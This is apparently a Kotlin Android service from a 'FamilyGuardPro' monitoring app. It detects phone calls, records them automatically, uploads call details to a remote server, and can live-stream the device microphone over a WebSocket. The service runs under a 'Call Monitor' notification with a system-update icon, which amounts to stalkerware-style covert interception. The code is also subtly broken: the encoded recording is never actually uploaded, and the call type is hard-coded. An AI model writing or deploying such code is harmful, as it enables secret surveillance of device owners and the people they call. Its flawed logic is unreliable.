package com.familyguardpro.services

import android.Manifest
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.IBinder
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.R
import com.familyguardpro.network.ApiClient
import com.familyguardpro.utils.AudioRecorder
import com.familyguardpro.utils.PreferenceManager
import kotlinx.coroutines.*
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import java.io.File
import java.net.URI
import java.text.SimpleDateFormat
import java.util.*

class CallRecordService : Service() {

    companion object {
        private const val TAG = "CallRecordService"
        private const val NOTIFICATION_ID = 1005
        private const val SAMPLE_RATE = 16000
        private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var preferenceManager: PreferenceManager
    
    private var audioRecorder: AudioRecorder? = null
    private var audioRecord: AudioRecord? = null
    private var webSocketClient: WebSocketClient? = null
    private var isRecording = false
    private var isLiveListening = false
    private var currentRecordingFile: File? = null
    private var phoneStateListener: PhoneStateListener? = null
    private var telephonyManager: TelephonyManager? = null
    private var currentPhoneNumber: String? = null

    override fun onCreate() {
        super.onCreate()
        preferenceManager = PreferenceManager(this)
        telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        setupPhoneStateListener()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground()
        
        when (intent?.getStringExtra("mode")) {
            "live_listen" -> startLiveListen()
            "record" -> startRecording()
            else -> {
                // Auto-detect based on call state
                if (preferenceManager.isCallRecordingEnabled()) {
                    registerPhoneStateListener()
                }
            }
        }
        
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        stopCallRecording()
        stopLiveListen()
        unregisterPhoneStateListener()
    }

    private fun startForeground() {
        val notification = NotificationCompat.Builder(this, FamilyGuardApp.NOTIFICATION_CHANNEL_STREAMING)
            .setContentTitle("Call Monitor")
            .setContentText("Active")
            .setSmallIcon(R.drawable.ic_system_update)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
        
        startForeground(NOTIFICATION_ID, notification)
    }

    @Suppress("DEPRECATION")
    private fun setupPhoneStateListener() {
        phoneStateListener = object : PhoneStateListener() {
            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                when (state) {
                    TelephonyManager.CALL_STATE_OFFHOOK -> {
                        // Call active
                        currentPhoneNumber = phoneNumber
                        if (preferenceManager.isCallRecordingEnabled() && !isRecording) {
                            startCallRecording()
                        }
                    }
                    TelephonyManager.CALL_STATE_IDLE -> {
                        // Call ended
                        if (isRecording) {
                            stopCallRecording()
                        }
                    }
                    TelephonyManager.CALL_STATE_RINGING -> {
                        // Incoming call
                        currentPhoneNumber = phoneNumber
                    }
                }
            }
        }
    }

    @Suppress("DEPRECATION")
    private fun registerPhoneStateListener() {
        telephonyManager?.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
    }

    @Suppress("DEPRECATION")
    private fun unregisterPhoneStateListener() {
        telephonyManager?.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
    }

    private fun startCallRecording() {
        if (isRecording) return
        isRecording = true
        
        Log.d(TAG, "Starting call recording for: $currentPhoneNumber")
        
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val fileName = "call_${timestamp}.mp3"
        currentRecordingFile = File(cacheDir, fileName)
        
        audioRecorder = AudioRecorder(this)
        audioRecorder?.startRecording(currentRecordingFile!!)
    }

    private fun stopCallRecording() {
        if (!isRecording) return
        isRecording = false
        
        Log.d(TAG, "Stopping call recording")
        
        audioRecorder?.stopRecording()
        
        // Upload recording
        currentRecordingFile?.let { file ->
            if (file.exists() && file.length() > 0) {
                uploadCallRecording(file, currentPhoneNumber)
            }
        }
    }

    private fun uploadCallRecording(file: File, phoneNumber: String?) {
        serviceScope.launch {
            try {
                val deviceId = preferenceManager.getDeviceId()
                val audioBytes = file.readBytes()
                val audioBase64 = Base64.encodeToString(audioBytes, Base64.NO_WRAP)
                
                ApiClient.api.uploadCallRecording(
                    deviceId,
                    com.familyguardpro.network.CallLogItem(
                        number = phoneNumber ?: "Unknown",
                        name = null,
                        type = "outgoing",
                        duration = (file.length() / 8000),
                        timestamp = System.currentTimeMillis()
                    )
                )
                
                Log.d(TAG, "Call recording uploaded successfully")
                
                // Delete local file
                file.delete()
                
            } catch (e: Exception) {
                Log.e(TAG, "Failed to upload call recording", e)
            }
        }
    }

    private fun startRecording() {
        // One-time recording
        val duration = 60 // seconds
        startCallRecording()
        
        serviceScope.launch {
            delay(duration * 1000L)
            stopCallRecording()
            stopSelf()
        }
    }

    private fun startLiveListen() {
        if (isLiveListening) return
        isLiveListening = true
        
        Log.d(TAG, "Starting live call listen")
        
        connectWebSocket {
            startAudioStreaming()
        }
    }

    private fun stopLiveListen() {
        if (!isLiveListening) return
        isLiveListening = false
        
        audioRecord?.stop()
        audioRecord?.release()
        audioRecord = null
        
        webSocketClient?.close()
        webSocketClient = null
    }

    private fun connectWebSocket(onConnected: () -> Unit) {
        val baseUrl = ApiClient.BASE_URL
            .replace("https://", "wss://")
            .replace("http://", "ws://")
        
        val wsUrl = "$baseUrl/api/stream/${preferenceManager.getDeviceId()}?type=live_call"
        
        webSocketClient = object : WebSocketClient(URI(wsUrl)) {
            override fun onOpen(handshakedata: ServerHandshake?) {
                Log.d(TAG, "WebSocket connected")
                onConnected()
            }

            override fun onMessage(message: String?) {}

            override fun onClose(code: Int, reason: String?, remote: Boolean) {
                Log.d(TAG, "WebSocket closed")
            }

            override fun onError(ex: Exception?) {
                Log.e(TAG, "WebSocket error", ex)
            }
        }
        
        webSocketClient?.connect()
    }

    private fun startAudioStreaming() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Audio permission not granted")
            return
        }
        
        val bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
        
        audioRecord = AudioRecord(
            MediaRecorder.AudioSource.VOICE_COMMUNICATION,
            SAMPLE_RATE,
            CHANNEL_CONFIG,
            AUDIO_FORMAT,
            bufferSize * 2
        )
        
        audioRecord?.startRecording()
        
        serviceScope.launch(Dispatchers.IO) {
            val buffer = ByteArray(bufferSize)
            
            while (isLiveListening && audioRecord?.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
                val read = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                if (read > 0) {
                    sendAudioData(buffer.copyOf(read))
                }
            }
        }
    }

    private fun sendAudioData(data: ByteArray) {
        if (webSocketClient?.isOpen != true) return
        
        try {
            val audioBase64 = Base64.encodeToString(data, Base64.NO_WRAP)
            webSocketClient?.send("audio:$audioBase64")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send audio", e)
        }
    }
}
